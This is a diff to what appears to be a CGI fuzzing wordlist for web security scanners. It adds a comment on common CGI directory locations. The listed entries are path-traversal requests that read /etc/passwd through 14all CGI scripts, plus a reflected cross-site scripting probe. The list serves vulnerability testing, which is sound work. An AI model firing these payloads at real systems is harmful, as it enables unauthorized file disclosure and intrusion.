@@ -1,3 +1,4 @@
+# fuzz inside cgi directories - on windows, this is usually /scripts /bin /cgi or /cgi-bin, on unix, usually /cgi-bin /cgi or /nph-cgi
 14all-1.1.cgi?cfg=../../../../../../../../etc/passwd
 14all.cgi?cfg=../../../../../../../../etc/passwd
 666%0a%0a<script>alert('Vulnerable');</script>666.jsp
